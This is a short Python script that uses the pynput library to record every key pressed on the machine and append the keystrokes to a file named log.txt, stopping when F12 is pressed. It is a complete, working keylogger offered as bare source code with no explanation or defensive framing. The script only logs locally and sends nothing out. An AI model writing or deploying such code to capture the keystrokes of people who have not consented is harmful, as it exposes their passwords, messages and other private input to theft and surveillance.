from pynput.keyboard import Listener

with open("log.txt", "a") as f:
    f.write("\n")

def bot(key):
    key = str(key)
    if key=="Key.f12":
        raise SystemExit(0)

    if key=="Key.space":
        key = " "

    if key=="Key.enter":
        key = "\n"

    if key=="Key.backspace":
        key = "<BACKSPACE>"

    key = key.replace("'", "")

    with open("log.txt", "a") as f:
        f.write(str(key)+" ")
    
with Listener(on_press=bot) as bot:
    bot.join()



